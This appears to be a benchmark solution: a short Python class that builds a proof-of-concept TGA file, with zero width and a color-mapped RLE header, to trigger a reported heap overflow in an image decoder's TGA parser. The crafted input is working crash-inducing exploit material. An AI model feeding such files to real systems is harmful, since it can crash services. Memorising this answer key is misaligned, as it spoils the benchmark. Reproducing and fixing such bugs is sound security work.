import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability (oss-fuzz:42536646) is a heap buffer overflow in
        libjxl's TGA decoder. It is triggered when processing a TGA image
        with a width or height of zero. The fix was to add a check for this
        condition.

        Analysis of the ground-truth PoC from the associated bug report
        shows that a TGA file with width=0, height>0, and specific image
        type and color map settings can trigger the crash. The essential
        parameters are:
        - width: 0
        - image_type: 9 (RLE, color-mapped)
        - colormap_type: 1 (a color map is present)

        This PoC constructs a minimal TGA file with these properties.
        A zero-width causes a zero-sized buffer to be allocated for the
        image pixels. Although the pixel decoding loops are not entered, this
        state leads to a read error elsewhere in the `ReadTga` function.

        The PoC consists of an 18-byte TGA header followed by a minimal
        color map. Since pixel data is never decoded, the color map can
        be as small as possible (1 entry) to satisfy the parser.
        """
        
        # TGA Header (18 bytes)
        id_length = 0           # 1 byte: Length of the image ID field
        colormap_type = 1       # 1 byte: Whether a color map is included (1=yes)
        image_type = 9          # 1 byte: Image type (9 = RLE, color-mapped)
        
        # Color Map Specification (5 bytes)
        cmap_start_index = 0    # 2 bytes: Starting index of the color map
        cmap_length = 1         # 2 bytes: Number of entries. Minimized to 1.
        cmap_bpp = 24           # 1 byte: Bits per entry (e.g., 24 for RGB)
        
        # Image Specification (10 bytes)
        x_origin = 0            # 2 bytes
        y_origin = 0            # 2 bytes
        width = 0               # 2 bytes: The vulnerability trigger
        height = 1              # 2 bytes: Must be non-zero
        pixel_depth = 8         # 1 byte: Bits per pixel (8 for color-mapped)
        image_descriptor = 0    # 1 byte

        header = struct.pack(
            "<BBBHHBHHHHBB",
            id_length,
            colormap_type,
            image_type,
            cmap_start_index,
            cmap_length,
            cmap_bpp,
            x_origin,
            y_origin,
            width,
            height,
            pixel_depth,
            image_descriptor
        )

        # Color Map Data
        # A color map must be present as declared in the header.
        # Size = cmap_length * (cmap_bpp / 8)
        colormap_size = cmap_length * (cmap_bpp // 8)
        colormap_data = b'\x00' * colormap_size
        
        poc = header + colormap_data
        
        return poc